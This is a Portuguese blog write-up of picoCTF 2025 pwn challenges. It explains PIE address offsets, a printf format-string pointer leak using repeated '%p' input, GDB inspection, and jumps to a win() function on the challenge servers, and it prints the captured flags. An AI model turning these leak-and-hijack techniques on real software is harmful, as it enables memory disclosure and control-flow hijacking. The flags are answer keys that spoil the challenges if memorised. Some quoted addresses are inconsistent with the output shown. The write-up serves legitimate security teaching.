---
layout: post
title: "Desafios de pwn do picoCTF 2025"
authors:
  - name: poit
    social: https://www.linkedin.com/in/gustavos-costa-soares
date: 2025-03-23
excerpt: "Soluções de desafios de pwn do picoCTF 2025"
---

# PIE TIME

O título do desafio sugere a necessidade de pesquisar o significado do termo "PIE".

### O que é Position Independent Executables (PIE)?

Position Independent Executables (PIE) são executáveis que podem ser carregados em qualquer endereço de memória, sem depender de um local fixo. Essa técnica implementa a randomização do endereço base tanto para o executável principal quanto para as bibliotecas compartilhadas.

Como o executável principal é alocado dinamicamente, todas as funções dentro dele também terão seus endereços ajustados conforme a nova posição do binário na memória.

### Executando o desafio

Baixe o código-fonte do desafio, compile e execute com:

```
gcc -o vuln vuln.c
./vuln
```

Teremos uma saída semelhante a esta:

```
Address of main: 0x55d36253e33d
Enter the address to jump to, ex => Ox12345:
```

Isso significa que o endereço da função `main()` foi carregado em 0x5604d1b0e33d, e o programa está pedindo um endereço para realizar um jump (desvio de execução), ou seja,  o endereço para ser executado.
 
Como o binário foi compilado com PIE, esse endereço será diferente a cada execução, pois a posição do código na memória será randomizada.

### Explorando o código-fonte

No código-fonte, há uma função chamada `win()`, cuja função é abrir e ler o arquivo "flag.txt". Esse arquivo provavelmente contém a chave necessária para resolver o desafio.

Nosso objetivo, portanto, é encontrar o endereço da função `win()` em tempo de execução e informar esse endereço ao programa, fazendo com que ele desvie a execução para essa função. Dessa forma, conseguiremos ler o conteúdo da flag.

```
int win() {
    FILE *fptr;
    char c;

    printf("You won!\n");

    // Open file
    fptr = fopen("flag.txt", "r");
    if (fptr == NULL) {
        printf("Cannot open file.\n");
        exit(0);
    }

    // Read contents from file
    c = fgetc(fptr);
    while (c != EOF) {
        printf("%c", c);
        c = fgetc(fptr);
    }

    printf("\n");
    fclose(fptr);
}

```
### Como descobrir o endereço da função `win()`?

Como temos acesso ao código-fonte, podemos modificar o programa localmente para imprimir o endereço da função win(), facilitando a análise. No entanto, no servidor do desafio, não será possível editar o código para exibir esse endereço diretamente, mas precisamos testar localmente para encontrar algum padrão.

Uma abordagem eficaz é adicionar uma linha ao código para exibir o endereço da função `win()`.  Isso pode nos ajudar a identificar um padrão e prever o endereço correto durante a execução no ambiente do desafio.

```
int main() {
    signal(SIGSEGV, segfault_handler);
    setvbuf(stdout, NULL, IONBF, 0); // IONBF = Unbuffered

    printf("Address of main: %p\n", &main);
    printf("Address of win: %p\n", &win);

```

Compilando e executando o código novamente:

```
gcc -o vuln vuln.c
./vuln
```

```
Address of main: 0x55cfc85f733d
Address of win: 0x55cfc85f72a7
Enter the address to jump to, ex => 0x12345:
```

Esse resultado não é muito revelador. No entanto, como o PIE define um endereço base para o executável, a função `main()` e `win()` terão endereços relativos entre si. Isso significa que, se a `main()` for carregada em um determinado endereço, a `win()` sempre estará a um deslocamento fixo em relação a ela. Assim, uma vez que descobrimos o endereço de `main()`, podemos calcular o endereço de `win()` somando esse deslocamento.

Em outras palavras:

```
Endereço de Win = Endereço de main + deslocamento
```

Vamos executar mais uma vez o mesmo código:

```
Address of main: 0x55fa243db33d
Address of win: 0x55fa243db2a7
Enter the address to jump to, ex => 0x12345:
```

Vamos fazer algumas contas para tentar identificar qual é a diferença do  endereço de win para o main e ver se segue algum padrão.

```
Para o primeiro caso: 0x55cfc85f733d (main) - 0x55cfc85f72a7 (win) = 0x96 (96 em hexadecimal) 
```

```
Para o segundo caso: 0x55fa243db33d (main) - 0x55fa243db2a7 (win) = 0x96 (96 em hexadecimal)
```

Se você ficar rodando diversas vezes, esse mesmo padrão vai se manter, a diferença entre o main e o win será sempre de 0x96.

Portanto, se sabemos o endereço da main, basta subtrair x96 e descobrimos o  da win

### Conectando via netcat

Para se conectar via netcat, basta copiar o comando disponibilizado quando inicializa a instância

```
nc rescued-float.picoctf.net 50799
```

No meu caso, o output foi:

```
Address of main: 0x5e1a72d9b33d
Enter the address to jump to, ex => 0x12345:
```

Então basta subtrair 0x96 no endereço da main: 

```
0x5e1a72d9b33d - 0x96 = 0x5e1a72d9b2a7
```

Colocando esse valor, o arquivo flag.txt do servidor vai abrir e será feito a leitura do conteúdo, revelando a flag do desafio.

```
Address of main: 0x5e1a72d9b33d
Enter the address to jump to, ex => 0x12345: 0x5e1a72d9b2a7 Your input: 5e1a72d9b2a7
You won!
picoCTF{b4s1c_p051t10n_1nd3p3nd3nc3_31cc212b}
```
---

# PIE TIME 2

Para resolver esse desafio é necessário saber mais um conceito novo: format string attack.

### Format String Attack

Format string attack acontece quando uma entrada de string é interpretado como um comando pela aplicação, permitindo que o atacante execute códigos ou leia os dados de uma stack. Um parâmetro de string é, por exemplo, `“%s”`, mas quando isso não é colocado na função `printf` (na linguagem C), isso abre espaço para ataques de format string.

---

### Analisando o código

Baixando o código fonte, nos deparamos com a função chamada `call_functions`:

```
void call_functions() {
    char buffer[64];
    printf("Enter your name:");
    fgets(buffer, 64, stdin);
    printf(buffer);

    unsigned long val;
    printf(" enter the address to jump to, ex => 0x123 ");
    scanf("%lx", &val);

    void (*foo)(void) = (void (*)()) val;
    foo();
}
```

Dentro dela, será requisitado um nome, que será armazenado em um vetor do tipo char com tamanho 64 chamado buffer. Isso será salvo com a função fgets.

No entanto, esse buffer não tem validação do que pode ser impresso, o conteúdo do buffer está sendo passado direto, sem especificar o formato, como `%s` para string. Desse modo, se digitarmos `%p%p`, a função printf vai interpretar esses caracteres como especificadores de formato e vai imprimir os ponteiros que estão salvos na pilha.

### Compilação e alerta de segurança

Inclusive, quando compilamos o código, um warning de segurança sobre isso é informado:

```
gcc -g vuln.c -o vuln
vuln.c: In function 'call_functions':
vuln.c:15:10: warning: format not a string literal and no format arguments [-Wformat-security] 
15 printf(buffer);
```

### Explorando o vazamento com format string

Podemos utilizar desse artifício para ver se tem algum valor armazenado na pilha que revela o endereço da função `win()`, que é o endereço que precisamos para fazer um `“jump”` e que revelará a flag.

Lembrando que a diferença entre o endereço da função main() e da win() é de 0x96, como já descrito no CTF do PIE TIME 1.

Se colocarmos `%p%p%p`, alguns endereços da pilha serão vazados:


```
Enter your name: %p%p%p 
0x25702570(nil)0x56160ab252a7
enter the address to jump to, ex => 0x12345:
```

Como o tamanho do buffer é de 64, podemos digitar esses caracteres diversas vezes…

### Debugando com GDB

Para facilitar a nossa vida, vamos utilizar o GNU Debugger, também conhecido como gdb. Ele serve para debugar programas em linguagens como C e C++, além de ser útil para analisar a memória do programa enquanto rodamos ele.

Podemos rodar os seguintes comandos:

```
gdb ./vuln # para rodar o binário com o gdb

break main # para marcar um ponto de parada na função main

run # para continuar a execução do programa

info address main # para saber o endereço de memória alocado para a função main
```

```
gdb ./vuln
GNU gdb (Ubuntu 9.2-0ubuntu1-20.04.2) 9.2
...
Reading symbols from ./vuln...
(gdb) break main
Breakpoint 1 at 0x1400: file vuln.c, line 50.
(gdb) run
Starting program: /home/gunote/picoCTF/vuln
Breakpoint 1, main () at vuln.c:50
50    int main() {
(gdb) info address main
Symbol "main" is a function at address 0x555555555400.
(gdb)
```

Agora sabemos onde está o endereço da main e podemos continuar o programa com o `continue`.

```
(gdb) info address main
Symbol "main" is a function at address 0x555555555400.
(gdb) continue
Continuing.
Enter your name:
```

Podemos digitar uma sequência de vários caracteres, indicando o endereço deles com o ponteiro e verificar se o dado vazado bate com o endereço da main, por exemplo:

```
%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p
```

```
(gdb) info address main
Symbol "main" is a function at address 0x555555555400.
(gdb) continue
Continuing.
Enter your name: %p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p
0x5555555592a1(nil)0x5555555592d50x7fffffff...0x555555555400

```

O endereço da main está na última posição dos endereços impressos.

### Executando remotamente

Fazendo agora o processo dentro do servidor do picoCTF:

```
%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p
```

```
nc rescued-float.picoctf.net 54717
Enter your name: %p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p
0x59f417ad42a1(nil)0x59f417ad42d3...0x59f3dd904400
enter the address to jump to, ex => 0x12345:
```

Agora, para descobrir o valor da função `win()`, basta subtrair o 0x96 do endereço encontrado. Dessa forma, podemos fazer o jump para a função win:

```
0x59f3dd904400 - 0x96 = 0x59f3dd90436a
```

O endereço da função `win` é:

```
0x59f3dd90436a
```

```
enter the address to jump to, ex => 0x12345: 0x59f3dd90436a
You won!
picoCTF{p13_5h0u1dn'7_134k_71356635}
```
---

# Rust Fixme

Baixe e extraia o arquivo `.tar.gz` com:

```
tar -xvzf arquivo.tar.gz
```

### Corrigindo o código Rust

No arquivo `main.rs`:

- Adicione ponto e vírgula onde necessário.
- Use `return` para retornar um valor.
- Use `println!` corretamente com `{}`.

```
fn main() {
    let res = 5 + 3;
    println!("Resultado: {}", res);
}
```

Compile e rode com:

```
cargo build
cargo run
```

Caso precise, instale o cargo com:

```
sudo apt install cargo
```

Dessa forma, o código rodará corretamente e a flag será exibida.
